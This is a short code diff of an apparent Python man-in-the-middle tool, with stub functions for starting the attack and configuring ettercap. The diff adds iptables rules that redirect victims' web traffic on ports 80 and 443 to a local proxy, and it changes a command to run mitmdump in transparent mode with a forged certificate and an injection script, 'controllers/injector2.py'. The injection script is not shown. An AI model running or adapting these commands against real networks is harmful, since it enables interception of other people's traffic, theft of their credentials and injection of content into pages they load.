@@ -7,13 +7,17 @@ import sys
 
 def start_mitm():
     pass
-    
-def configure_iptables():
+
+def config_ettercap():
+    pass
+
+def config_iptables():
     os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
     return True
     
 def get_cert(path, basename):
-    os.system("~/.local/bin/mitmproxy -p 8080 -s 'cert *=cert.pem' 'controllers/injector2.py controllers/script.js' -T")
+    os.system("~/.local/bin/mitmdump --mode transparent -s controllers/injector2.py --certs *=cert.pem")
     return True
 
 def get_stats(secret_key, params={}):
